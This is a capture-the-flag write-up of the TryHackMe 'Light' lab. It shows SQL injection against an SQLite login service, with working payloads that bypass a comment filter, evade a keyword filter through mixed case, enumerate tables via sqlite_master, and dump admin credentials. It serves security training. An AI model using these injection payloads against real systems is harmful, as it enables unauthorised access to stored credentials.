---
date: "2025-02-05T19:03:58.133Z"
title: "Writeup: TryHackMe Light"
categories:
    - "it"
    - "writeups"
slug: "writeup-tryhackme-light"
---


> [!info]
> - [Light](https://tryhackme.com/r/room/lightroom)
> - Difficulty: easy
> - Platform: db
> 
> I am working on a database application called Light! Would you like to try it out?  If so, the application is running on port 1337. You can connect to it using `nc MACHINE_IP 1337`. You can use the username `smokey` in order to get started.



Connect to the machine and try invalid and valid usernames:

```bash
$ nc MACHINE_IP 1337
Welcome to the Light database!
Please enter your username: blah
Username not found.
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

Try a quote to check for injection vulnerabilities:

```
Please enter your username: smokey'
Error: unrecognized token: "'smokey'' LIMIT 30"
```

Good, we're dealing with the database. Let's break out of the error with a comment:

```
Please enter your username: smokey'--
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Ok, no comments. We can do it differently:

```
Please enter your username: smokey' or '
Password: vYQ5ngPpw8AdUmL
```

> [!note]
> After finishing the room I learned that you can do `smokey' '` to create a [SQL alias](https://www.w3schools.com/sql/sql_alias.asp) with the same result.


So, there is some filtering here. And it also checks keywords:

```
Please enter your username: ' UNION 
Ahh there is a word in there I don't like :(
```

At this point I guessed that room's name hinted at SQLite database. Using this [SQLite explotaition paper](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf) as a reference, let's enumerate tables and their structures. To escape keyword filtering we can use random letter cases.

```
Please enter your username: -1' UnioN Select group_concat(tbl_name) FRoM sqlite_master WhEre type='table' and tbl_name NOT like 'sqlite_%' or '
Password: usertable,admintable

Please enter your username: -1'  UnIon SeLeCT sql FroM sqlite_master WHerE type!='meta' AND sql NOT NULL AND name ='usertable' or '
Password: CREATE TABLE usertable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
Please enter your username: -1'  UnIon SeLeCT sql FroM sqlite_master WHerE type!='meta' AND sql NOT NULL AND name ='admintable' or '
Password: CREATE TABLE admintable (
                   id INTEGER PRIMARY KEY,
                   username TEXT,
                   password INTEGER)
```

We're ready to get flags. First flag: admin username.

```
Please enter your username: -1'  UnIon SeLeCT group_concat(username) FroM 'admintable' WHERE id NOT NULL or ' 
Password: REDACTED,flag
```

Second and third flags: admin passwords and flag value.

```
Please enter your username:-1'  UnIon SeLeCT group_concat(password) FroM 'admintable' WHERE id NOT NULL or '
Password: REDACTED,REDACTED

```

Or, to get a full table with all flags at once:

```
Please enter your username: -1'  UnIon SeLeCT GROUP_CONCAT(username || ' ' || password, ', ') AS combined FroM 'admintable' WHERE id NOT NULL or '
Password: REDACTED REDACTED, flag REDACTED
```

